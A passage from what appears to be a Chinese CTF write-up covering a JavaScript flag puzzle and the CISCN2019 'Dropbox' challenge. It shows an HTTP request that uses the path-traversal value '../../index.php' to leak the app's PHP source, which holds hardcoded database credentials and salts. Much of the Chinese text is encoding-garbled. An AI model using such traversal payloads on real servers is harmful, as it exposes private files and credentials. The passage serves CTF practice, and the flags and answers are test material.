</span></span><span style=display:flex><span>    <span style=color:#a6e22e>let</span> <span style=color:#a6e22e>n </span><span style=color:#f92672>=</span> <span style=color:#e6db74>key.charCodeAt(i)</span> <span style=color:#960050;background-color:#1e0010>%</span> <span style=color:#a6e22e>flag</span><span style=color:#960050;background-color:#1e0010>.</span><span style=color:#a6e22e>length</span><span style=color:#960050;background-color:#1e0010>;</span>
</span></span><span style=display:flex><span>    <span style=color:#a6e22e>let</span> <span style=color:#a6e22e>temp </span><span style=color:#f92672>=</span> <span style=color:#e6db74>flag[i];</span>
</span></span><span style=display:flex><span>    <span style=color:#a6e22e>flag</span><span style=color:#960050;background-color:#1e0010>[</span><span style=color:#a6e22e>i</span><span style=color:#960050;background-color:#1e0010>]</span> <span style=color:#960050;background-color:#1e0010>=</span> <span style=color:#a6e22e>flag</span><span style=color:#960050;background-color:#1e0010>[</span><span style=color:#a6e22e>n</span><span style=color:#960050;background-color:#1e0010>];</span>
</span></span><span style=display:flex><span>    <span style=color:#a6e22e>flag</span><span style=color:#960050;background-color:#1e0010>[</span><span style=color:#a6e22e>n</span><span style=color:#960050;background-color:#1e0010>]</span> <span style=color:#960050;background-color:#1e0010>=</span> <span style=color:#a6e22e>temp</span><span style=color:#960050;background-color:#1e0010>;</span>
</span></span><span style=display:flex><span>  <span style=color:#960050;background-color:#1e0010>}</span>
</span></span><span style=display:flex><span>  <span style=color:#a6e22e>return</span> <span style=color:#a6e22e>flag</span><span style=color:#960050;background-color:#1e0010>;</span>
</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>}</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#a6e22e>function</span> <span style=color:#a6e22e>check_action</span><span style=color:#960050;background-color:#1e0010>()</span> <span style=color:#960050;background-color:#1e0010>{</span>
</span></span><span style=display:flex><span>  <span style=color:#a6e22e>var</span> <span style=color:#a6e22e>action </span><span style=color:#f92672>=</span> <span style=color:#e6db74>document.getElementById(&#34;action&#34;).value;</span>
</span></span><span style=display:flex><span>  <span style=color:#a6e22e>var</span> <span style=color:#a6e22e>flag </span><span style=color:#f92672>=</span> <span style=color:#e6db74>[&#34;{hey&#34;,</span> <span style=color:#960050;background-color:#1e0010>&#34;</span><span style=color:#a6e22e>_boy</span><span style=color:#960050;background-color:#1e0010>&#34;,</span> <span style=color:#960050;background-color:#1e0010>&#34;</span><span style=color:#a6e22e>aaaa</span><span style=color:#960050;background-color:#1e0010>&#34;,</span> <span style=color:#960050;background-color:#1e0010>&#34;</span><span style=color:#a6e22e>s_im</span><span style=color:#960050;background-color:#1e0010>&#34;,</span> <span style=color:#960050;background-color:#1e0010>&#34;</span><span style=color:#a6e22e>ck</span><span style=color:#960050;background-color:#1e0010>!}&#34;,</span> <span style=color:#960050;background-color:#1e0010>&#34;</span><span style=color:#a6e22e>_baa</span><span style=color:#960050;background-color:#1e0010>&#34;,</span> <span style=color:#960050;background-color:#1e0010>&#34;</span><span style=color:#a6e22e>aaaa</span><span style=color:#960050;background-color:#1e0010>&#34;,</span> <span style=color:#960050;background-color:#1e0010>&#34;</span><span style=color:#a6e22e>pctf</span><span style=color:#960050;background-color:#1e0010>&#34;];</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>  <span style=color:#960050;background-color:#1e0010>//</span> <span style=color:#a6e22e>TODO:</span> <span style=color:#a6e22e>unscramble</span> <span style=color:#a6e22e>function</span>
</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>}</span>
</span></span></code></pre></div><p>è‡ªå·±æ‹¼æ¥è¯»ä¸€ä¸‹å°±å‡ºæ¥äº†ï¼Œåº”è¯¥æ˜¯å›½é™…èµ›è€ƒä¸€ç‚¹è„‘æ´</p><pre tabindex=0><code>pctf{hey_boys_im_baaaaaaaaaack!}
</code></pre><h2 id=ciscn2019-ååŒ—èµ›åŒº-day1-web1dropbox>[CISCN2019 ååŒ—èµ›åŒº Day1 Web1]Dropbox</h2><p>å…ˆæ³¨å†Œä¸€ä¸ªè´¦æˆ·,éšä¾¿ä¸Šä¼ ä¸€ä¸ªå›¾ç‰‡ï¼Œç‚¹å‡»ä¸‹è½½æŠ“åŒ…</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>POST /download.php HTTP/1.1
</span></span><span style=display:flex><span>Host: 9e6676fa-87d1-40a1-85db-5b10c7969b54.node5.buuoj.cn:81
</span></span><span style=display:flex><span>Content-Length: <span style=color:#ae81ff>24</span>
</span></span><span style=display:flex><span>Cache-Control: max-age<span style=color:#f92672>=</span><span style=color:#ae81ff>0</span>
</span></span><span style=display:flex><span>Upgrade-Insecure-Requests: <span style=color:#ae81ff>1</span>
</span></span><span style=display:flex><span>User-Agent: Mozilla/5.0 <span style=color:#f92672>(</span>Windows NT 10.0; Win64; x64<span style=color:#f92672>)</span> AppleWebKit/537.36 <span style=color:#f92672>(</span>KHTML, like Gecko<span style=color:#f92672>)</span> Chrome/133.0.0.0 Safari/537.36 Edg/133.0.0.0
</span></span><span style=display:flex><span>Origin: http://9e6676fa-87d1-40a1-85db-5b10c7969b54.node5.buuoj.cn:81
</span></span><span style=display:flex><span>Content-Type: application/x-www-form-urlencoded
</span></span><span style=display:flex><span>Accept: text/html,application/xhtml+xml,application/xml;q<span style=color:#f92672>=</span>0.9,image/avif,image/webp,image/apng,*/*;q<span style=color:#f92672>=</span>0.8,application/signed-exchange;v<span style=color:#f92672>=</span>b3;q<span style=color:#f92672>=</span>0.7
</span></span><span style=display:flex><span>Referer: http://9e6676fa-87d1-40a1-85db-5b10c7969b54.node5.buuoj.cn:81/index.php
</span></span><span style=display:flex><span>Accept-Encoding: gzip, deflate
</span></span><span style=display:flex><span>Accept-Language: zh-CN,zh;q<span style=color:#f92672>=</span>0.9,en;q<span style=color:#f92672>=</span>0.8,en-GB;q<span style=color:#f92672>=</span>0.7,en-US;q<span style=color:#f92672>=</span>0.6
</span></span><span style=display:flex><span>Cookie: PHPSESSID<span style=color:#f92672>=</span>6829a2a9286110ce4b7a533537d32d05
</span></span><span style=display:flex><span>Connection: close
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>filename<span style=color:#f92672>=</span>../../index.php
</span></span></code></pre></div><p>ç±»ä¼¼è¿™æ ·,(è¿‡æ»¤æ²¡å¿…è¦çš„å†…å®¹)</p><pre tabindex=0><code class=language-php+HTML data-lang=php+HTML>//index.php
&lt;?php
session_start();
if (!isset($_SESSION[&#39;login&#39;])) {
    header(&#34;Location: login.php&#34;);
    die();
}
?&gt;

&lt;body&gt;
    &lt;nav aria-label=&#34;breadcrumb&#34;&gt;
    &lt;ol class=&#34;breadcrumb&#34;&gt;
        &lt;li class=&#34;breadcrumb-item active&#34;&gt;ç» ï¼„æ‚Šé—ˆãˆ¡æ¾˜&lt;/li&gt;
        &lt;li class=&#34;breadcrumb-item active&#34;&gt;&lt;label for=&#34;fileInput&#34; class=&#34;fileLabel&#34;&gt;æ¶“å©ç´¶é‚å›¦æ¬¢&lt;/label&gt;&lt;/li&gt;
        &lt;li class=&#34;active ml-auto&#34;&gt;&lt;a href=&#34;#&#34;&gt;æµ£çŠ²ã‚½ &lt;?php echo $_SESSION[&#39;username&#39;]?&gt;&lt;/a&gt;&lt;/li&gt;
    &lt;/ol&gt;
&lt;/nav&gt;
&lt;input type=&#34;file&#34; id=&#34;fileInput&#34; class=&#34;hidden&#34;&gt;
&lt;div class=&#34;top&#34; id=&#34;toast-container&#34;&gt;&lt;/div&gt;
&lt;?php
include &#34;class.php&#34;;

$a = new FileList($_SESSION[&#39;sandbox&#39;]);
$a-&gt;Name();
$a-&gt;Size();
?&gt;
</code></pre><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=display:flex><span><span style=color:#75715e>//download.php
</span></span></span><span style=display:flex><span><span style=color:#f92672>&lt;?</span><span style=color:#a6e22e>php</span>
</span></span><span style=display:flex><span><span style=color:#a6e22e>session_start</span>();
</span></span><span style=display:flex><span><span style=color:#66d9ef>if</span> (<span style=color:#f92672>!</span><span style=color:#a6e22e>isset</span>($_SESSION[<span style=color:#e6db74>&#39;login&#39;</span>])) {
</span></span><span style=display:flex><span>    <span style=color:#a6e22e>header</span>(<span style=color:#e6db74>&#34;Location: login.php&#34;</span>);
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>die</span>();
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>if</span> (<span style=color:#f92672>!</span><span style=color:#a6e22e>isset</span>($_POST[<span style=color:#e6db74>&#39;filename&#39;</span>])) {
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>die</span>();
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>include</span> <span style=color:#e6db74>&#34;class.php&#34;</span>;
</span></span><span style=display:flex><span><span style=color:#a6e22e>ini_set</span>(<span style=color:#e6db74>&#34;open_basedir&#34;</span>, <span style=color:#a6e22e>getcwd</span>() <span style=color:#f92672>.</span> <span style=color:#e6db74>&#34;:/etc:/tmp&#34;</span>);
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#a6e22e>chdir</span>($_SESSION[<span style=color:#e6db74>&#39;sandbox&#39;</span>]);
</span></span><span style=display:flex><span>$file <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> <span style=color:#a6e22e>File</span>();
</span></span><span style=display:flex><span>$filename <span style=color:#f92672>=</span> (<span style=color:#a6e22e>string</span>) $_POST[<span style=color:#e6db74>&#39;filename&#39;</span>];
</span></span><span style=display:flex><span><span style=color:#66d9ef>if</span> (<span style=color:#a6e22e>strlen</span>($filename) <span style=color:#f92672>&lt;</span> <span style=color:#ae81ff>40</span> <span style=color:#f92672>&amp;&amp;</span> $file<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>open</span>($filename) <span style=color:#f92672>&amp;&amp;</span> <span style=color:#a6e22e>stristr</span>($filename, <span style=color:#e6db74>&#34;flag&#34;</span>) <span style=color:#f92672>===</span> <span style=color:#66d9ef>false</span>) {
</span></span><span style=display:flex><span>    <span style=color:#a6e22e>Header</span>(<span style=color:#e6db74>&#34;Content-type: application/octet-stream&#34;</span>);
</span></span><span style=display:flex><span>    <span style=color:#a6e22e>Header</span>(<span style=color:#e6db74>&#34;Content-Disposition: attachment; filename=&#34;</span> <span style=color:#f92672>.</span> <span style=color:#a6e22e>basename</span>($filename));
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>echo</span> $file<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>close</span>();
</span></span><span style=display:flex><span>} <span style=color:#66d9ef>else</span> {
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>echo</span> <span style=color:#e6db74>&#34;File not exist&#34;</span>;
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span><span style=color:#75715e>?&gt;</span><span style=color:#960050;background-color:#1e0010>
</span></span></span></code></pre></div><pre tabindex=0><code class=language-php+HTML data-lang=php+HTML>//login.php
&lt;?php
session_start();
if (isset($_SESSION[&#39;login&#39;])) {
    header(&#34;Location: index.php&#34;);
    die();
}
?&gt;

&lt;!doctype html&gt;

&lt;head&gt;
  &lt;meta charset=&#34;utf-8&#34;&gt;
  &lt;meta name=&#34;viewport&#34; content=&#34;width=device-width, initial-scale=1, shrink-to-fit=no&#34;&gt;
  &lt;meta name=&#34;description&#34; content=&#34;&#34;&gt;
  &lt;title&gt;Ã§Â™Â»Ã¥Â½Â•&lt;/title&gt;

  &lt;!-- Bootstrap core CSS --&gt;
  &lt;link href=&#34;static/css/bootstrap.min.css&#34; rel=&#34;stylesheet&#34;&gt;


  &lt;style&gt;
    .bd-placeholder-img {
      font-size: 1.125rem;
      text-anchor: middle;
    }

    @media (min-width: 768px) {
      .bd-placeholder-img-lg {
        font-size: 3.5rem;
      }
    }
  &lt;/style&gt;
  &lt;!-- Custom styles for this template --&gt;
  &lt;link href=&#34;static/css/std.css&#34; rel=&#34;stylesheet&#34;&gt;
&lt;/head&gt;

&lt;body class=&#34;text-center&#34;&gt;
  &lt;form class=&#34;form-signin&#34; action=&#34;login.php&#34; method=&#34;POST&#34;&gt;
    &lt;h1 class=&#34;h3 mb-3 font-weight-normal&#34;&gt;Ã§Â™Â»Ã¥Â½Â•&lt;/h1&gt;
    &lt;label for=&#34;username&#34; class=&#34;sr-only&#34;&gt;Username&lt;/label&gt;
    &lt;input type=&#34;text&#34; name=&#34;username&#34; class=&#34;form-control&#34; placeholder=&#34;Username&#34; required autofocus&gt;
    &lt;label for=&#34;password&#34; class=&#34;sr-only&#34;&gt;Password&lt;/label&gt;
    &lt;input type=&#34;password&#34; name=&#34;password&#34; class=&#34;form-control&#34; placeholder=&#34;Password&#34; required&gt;
    &lt;button class=&#34;btn btn-lg btn-primary btn-block&#34; type=&#34;submit&#34;&gt;Ã¦ÂÂÃ¤ÂºÂ¤&lt;/button&gt;
    &lt;p class=&#34;mt-5 text-muted&#34;&gt;Ã¨Â¿Â˜Ã¦Â²Â¡Ã¦ÂœÂ‰Ã¨Â´Â¦Ã¥ÂÂ·? &lt;a href=&#34;register.php&#34;&gt;Ã¦Â³Â¨Ã¥Â†ÂŒ&lt;/a&gt;&lt;/p&gt;
    &lt;p class=&#34;text-muted&#34;&gt;&amp;copy; 2018-2019&lt;/p&gt;
  &lt;/form&gt;
  &lt;div class=&#34;top&#34; id=&#34;toast-container&#34;&gt;&lt;/div&gt;
&lt;/body&gt;

&lt;script src=&#34;static/js/jquery.min.js&#34;&gt;&lt;/script&gt;
&lt;script src=&#34;static/js/bootstrap.bundle.min.js&#34;&gt;&lt;/script&gt;
&lt;script src=&#34;static/js/toast.js&#34;&gt;&lt;/script&gt;
&lt;/html&gt;


&lt;?php
include &#34;class.php&#34;;

if (isset($_GET[&#39;register&#39;])) {
    echo &#34;&lt;script&gt;toast(&#39;Ã¦Â³Â¨Ã¥Â†ÂŒÃ¦ÂˆÂÃ¥ÂŠÂŸ&#39;, &#39;info&#39;);&lt;/script&gt;&#34;;
}

if (isset($_POST[&#34;username&#34;]) &amp;&amp; isset($_POST[&#34;password&#34;])) {
    $u = new User();
    $username = (string) $_POST[&#34;username&#34;];
    $password = (string) $_POST[&#34;password&#34;];
    if (strlen($username) &lt; 20 &amp;&amp; $u-&gt;verify_user($username, $password)) {
        $_SESSION[&#39;login&#39;] = true;
        $_SESSION[&#39;username&#39;] = htmlentities($username);
        $sandbox = &#34;uploads/&#34; . sha1($_SESSION[&#39;username&#39;] . &#34;sftUahRiTz&#34;) . &#34;/&#34;;
        if (!is_dir($sandbox)) {
            mkdir($sandbox);
        }
        $_SESSION[&#39;sandbox&#39;] = $sandbox;
        echo(&#34;&lt;script&gt;window.location.href=&#39;index.php&#39;;&lt;/script&gt;&#34;);
        die();
    }
    echo &#34;&lt;script&gt;toast(&#39;Ã¨Â´Â¦Ã¥ÂÂ·Ã¦ÂˆÂ–Ã¥Â¯Â†Ã§Â ÂÃ©Â”Â™Ã¨Â¯Â¯&#39;, &#39;warning&#39;);&lt;/script&gt;&#34;;
}
?&gt;
</code></pre><p>ç„¶åçœ‹ï¼Œæ¯ä¸€ä¸ªæ–‡ä»¶éƒ½includeäº†è¿™ä¸ªphp</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=display:flex><span><span style=color:#f92672>&lt;?</span><span style=color:#a6e22e>php</span>
</span></span><span style=display:flex><span><span style=color:#a6e22e>error_reporting</span>(<span style=color:#ae81ff>0</span>);
</span></span><span style=display:flex><span>$dbaddr <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;127.0.0.1&#34;</span>;
</span></span><span style=display:flex><span>$dbuser <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;root&#34;</span>;
</span></span><span style=display:flex><span>$dbpass <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;root&#34;</span>;
</span></span><span style=display:flex><span>$dbname <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;dropbox&#34;</span>;
</span></span><span style=display:flex><span>$db <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> <span style=color:#a6e22e>mysqli</span>($dbaddr, $dbuser, $dbpass, $dbname);
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>class</span> <span style=color:#a6e22e>User</span> {
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>public</span> $db;
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>public</span> <span style=color:#66d9ef>function</span> <span style=color:#a6e22e>__construct</span>() {
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>global</span> $db;
</span></span><span style=display:flex><span>        $this<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>db</span> <span style=color:#f92672>=</span> $db;
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>public</span> <span style=color:#66d9ef>function</span> <span style=color:#a6e22e>user_exist</span>($username) {
</span></span><span style=display:flex><span>        $stmt <span style=color:#f92672>=</span> $this<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>db</span><span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>prepare</span>(<span style=color:#e6db74>&#34;SELECT `username` FROM `users` WHERE `username` = ? LIMIT 1;&#34;</span>);
</span></span><span style=display:flex><span>        $stmt<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>bind_param</span>(<span style=color:#e6db74>&#34;s&#34;</span>, $username);
</span></span><span style=display:flex><span>        $stmt<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>execute</span>();
</span></span><span style=display:flex><span>        $stmt<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>store_result</span>();
</span></span><span style=display:flex><span>        $count <span style=color:#f92672>=</span> $stmt<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>num_rows</span>;
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>if</span> ($count <span style=color:#f92672>===</span> <span style=color:#ae81ff>0</span>) {
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>return</span> <span style=color:#66d9ef>false</span>;
</span></span><span style=display:flex><span>        }
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span> <span style=color:#66d9ef>true</span>;
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>public</span> <span style=color:#66d9ef>function</span> <span style=color:#a6e22e>add_user</span>($username, $password) {
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>if</span> ($this<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>user_exist</span>($username)) {
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>return</span> <span style=color:#66d9ef>false</span>;
</span></span><span style=display:flex><span>        }
</span></span><span style=display:flex><span>        $password <span style=color:#f92672>=</span> <span style=color:#a6e22e>sha1</span>($password <span style=color:#f92672>.</span> <span style=color:#e6db74>&#34;SiAchGHmFx&#34;</span>);
</span></span><span style=display:flex><span>        $stmt <span style=color:#f92672>=</span> $this<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>db</span><span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>prepare</span>(<span style=color:#e6db74>&#34;INSERT INTO `users` (`id`, `username`, `password`) VALUES (NULL, ?, ?);&#34;</span>);
</span></span><span style=display:flex><span>        $stmt<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>bind_param</span>(<span style=color:#e6db74>&#34;ss&#34;</span>, $username, $password);
</span></span><span style=display:flex><span>        $stmt<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>execute</span>();
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span> <span style=color:#66d9ef>true</span>;
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>public</span> <span style=color:#66d9ef>function</span> <span style=color:#a6e22e>verify_user</span>($username, $password) {
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>if</span> (<span style=color:#f92672>!</span>$this<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>user_exist</span>($username)) {
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>return</span> <span style=color:#66d9ef>false</span>;
</span></span><span style=display:flex><span>        }
</span></span><span style=display:flex><span>        $password <span style=color:#f92672>=</span> <span style=color:#a6e22e>sha1</span>($password <span style=color:#f92672>.</span> <span style=color:#e6db74>&#34;SiAchGHmFx&#34;</span>);
</span></span><span style=display:flex><span>        $stmt <span style=color:#f92672>=</span> $this<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>db</span><span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>prepare</span>(<span style=color:#e6db74>&#34;SELECT `password` FROM `users` WHERE `username` = ?;&#34;</span>);
</span></span><span style=display:flex><span>        $stmt<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>bind_param</span>(<span style=color:#e6db74>&#34;s&#34;</span>, $username);
</span></span><span style=display:flex><span>        $stmt<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>execute</span>();
</span></span><span style=display:flex><span>        $stmt<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>bind_result</span>($expect);
</span></span><span style=display:flex><span>        $stmt<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>fetch</span>();
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>if</span> (<span style=color:#a6e22e>isset</span>($expect) <span style=color:#f92672>&amp;&amp;</span> $expect <span style=color:#f92672>===</span> $password) {
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>return</span> <span style=color:#66d9ef>true</span>;
</span></span><span style=display:flex><span>        }
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span> <span style=color:#66d9ef>false</span>;
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>public</span> <span style=color:#66d9ef>function</span> <span style=color:#a6e22e>__destruct</span>() {
</span></span><span style=display:flex><span>        $this<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>db</span><span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>close</span>();
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>class</span> <span style=color:#a6e22e>FileList</span> {
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>private</span> $files;
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>private</span> $results;
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>private</span> $funcs;
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>public</span> <span style=color:#66d9ef>function</span> <span style=color:#a6e22e>__construct</span>($path) {
</span></span><span style=display:flex><span>        $this<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>files</span> <span style=color:#f92672>=</span> <span style=color:#66d9ef>array</span>();
</span></span><span style=display:flex><span>        $this<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>results</span> <span style=color:#f92672>=</span> <span style=color:#66d9ef>array</span>();
</span></span><span style=display:flex><span>        $this<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>funcs</span> <span style=color:#f92672>=</span> <span style=color:#66d9ef>array</span>();
</span></span><span style=display:flex><span>        $filenames <span style=color:#f92672>=</span> <span style=color:#a6e22e>scandir</span>($path);
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>        $key <span style=color:#f92672>=</span> <span style=color:#a6e22e>array_search</span>(<span style=color:#e6db74>&#34;.&#34;</span>, $filenames);
</span></span><span style=display:flex><span>        <span style=color:#a6e22e>unset</span>($filenames[$key]);
</span></span><span style=display:flex><span>        $key <span style=color:#f92672>=</span> <span style=color:#a6e22e>array_search</span>(<span style=color:#e6db74>&#34;..&#34;</span>, $filenames);
</span></span><span style=display:flex><span>        <span style=color:#a6e22e>unset</span>($filenames[$key]);
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>foreach</span> ($filenames <span style=color:#66d9ef>as</span> $filename) {
</span></span><span style=display:flex><span>            $file <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> <span style=color:#a6e22e>File</span>();
</span></span><span style=display:flex><span>            $file<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>open</span>($path <span style=color:#f92672>.</span> $filename);
</span></span><span style=display:flex><span>            <span style=color:#a6e22e>array_push</span>($this<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>files</span>, $file);
</span></span><span style=display:flex><span>            $this<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>results</span>[$file<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>name</span>()] <span style=color:#f92672>=</span> <span style=color:#66d9ef>array</span>();
</span></span><span style=display:flex><span>        }
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>public</span> <span style=color:#66d9ef>function</span> <span style=color:#a6e22e>__call</span>($func, $args) {
</span></span><span style=display:flex><span>        <span style=color:#a6e22e>array_push</span>($this<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>funcs</span>, $func);
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>foreach</span> ($this<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>files</span> <span style=color:#66d9ef>as</span> $file) {
</span></span><span style=display:flex><span>            $this<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>results</span>[$file<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>name</span>()][$func] <span style=color:#f92672>=</span> $file<span style=color:#f92672>-&gt;</span>$func();
</span></span><span style=display:flex><span>        }
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>public</span> <span style=color:#66d9ef>function</span> <span style=color:#a6e22e>__destruct</span>() {
</span></span><span style=display:flex><span>        $table <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;&lt;div id=&#34;container&#34; class=&#34;container&#34;&gt;&lt;div class=&#34;table-responsive&#34;&gt;&lt;table id=&#34;table&#34; class=&#34;table table-bordered table-hover sm-font&#34;&gt;&#39;</span>;
</span></span><span style=display:flex><span>        $table <span style=color:#f92672>.=</span> <span style=color:#e6db74>&#39;&lt;thead&gt;&lt;tr&gt;&#39;</span>;
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>foreach</span> ($this<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>funcs</span> <span style=color:#66d9ef>as</span> $func) {
</span></span><span style=display:flex><span>            $table <span style=color:#f92672>.=</span> <span style=color:#e6db74>&#39;&lt;th scope=&#34;col&#34; class=&#34;text-center&#34;&gt;&#39;</span> <span style=color:#f92672>.</span> <span style=color:#a6e22e>htmlentities</span>($func) <span style=color:#f92672>.</span> <span style=color:#e6db74>&#39;&lt;/th&gt;&#39;</span>;
</span></span><span style=display:flex><span>        }
</span></span><span style=display:flex><span>        $table <span style=color:#f92672>.=</span> <span style=color:#e6db74>&#39;&lt;th scope=&#34;col&#34; class=&#34;text-center&#34;&gt;Opt&lt;/th&gt;&#39;</span>;
</span></span><span style=display:flex><span>        $table <span style=color:#f92672>.=</span> <span style=color:#e6db74>&#39;&lt;/thead&gt;&lt;tbody&gt;&#39;</span>;
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>foreach</span> ($this<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>results</span> <span style=color:#66d9ef>as</span> $filename <span style=color:#f92672>=&gt;</span> $result) {
</span></span><span style=display:flex><span>            $table <span style=color:#f92672>.=</span> <span style=color:#e6db74>&#39;&lt;tr&gt;&#39;</span>;
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>foreach</span> ($result <span style=color:#66d9ef>as</span> $func <span style=color:#f92672>=&gt;</span> $value) {
</span></span><span style=display:flex><span>                $table <span style=color:#f92672>.=</span> <span style=color:#e6db74>&#39;&lt;td class=&#34;text-center&#34;&gt;&#39;</span> <span style=color:#f92672>.</span> <span style=color:#a6e22e>htmlentities</span>($value) <span style=color:#f92672>.</span> <span style=color:#e6db74>&#39;&lt;/td&gt;&#39;</span>;
</span></span><span style=display:flex><span>            }
</span></span><span style=display:flex><span>            $table <span style=color:#f92672>.=</span> <span style=color:#e6db74>&#39;&lt;td class=&#34;text-center&#34; filename=&#34;&#39;</span> <span style=color:#f92672>.</span> <span style=color:#a6e22e>htmlentities</span>($filename) <span style=color:#f92672>.</span> <span style=color:#e6db74>&#39;&#34;&gt;&lt;a href=&#34;#&#34; class=&#34;download&#34;&gt;æ¶“å¬­æµ‡&lt;/a&gt; / &lt;a href=&#34;#&#34; class=&#34;delete&#34;&gt;é’çŠ»æ«&lt;/a&gt;&lt;/td&gt;&#39;</span>;
</span></span><span style=display:flex><span>            $table <span style=color:#f92672>.=</span> <span style=color:#e6db74>&#39;&lt;/tr&gt;&#39;</span>;
</span></span><span style=display:flex><span>        }
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>echo</span> $table;
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>class</span> <span style=color:#a6e22e>File</span> {
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>public</span> $filename;
</span></span><span style=display:flex><span>
